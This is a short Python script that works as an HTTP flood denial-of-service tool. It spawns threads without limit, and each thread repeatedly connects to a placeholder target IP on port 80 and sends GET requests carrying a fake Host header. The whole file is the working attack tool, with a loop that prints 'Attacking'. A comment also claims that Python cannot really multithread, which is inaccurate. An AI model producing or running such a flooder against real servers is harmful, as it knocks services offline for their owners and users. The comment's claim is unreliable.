import threading
import socket

target = "XXX.XXX.XXX.XXX"
port = 80
fake_ip = "XXX.XXX.XXX.XXX"

def attack():
    while True:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((target,port))
        server.sendto((f'GET /{target} HTTP/1.1\r\n').encode('ascii'), (target,port))
        server.sendto((f'Host: {fake_ip}\r\n\r\n').encode('ascii'), (target,port))
        server.close()

# Fun Fact : Python just simulates Multi-Threading but actually it is not capable of Multi-Threading.
while True:
    print("Attacking")
    thread = threading.Thread(target=attack)
    thread.start()
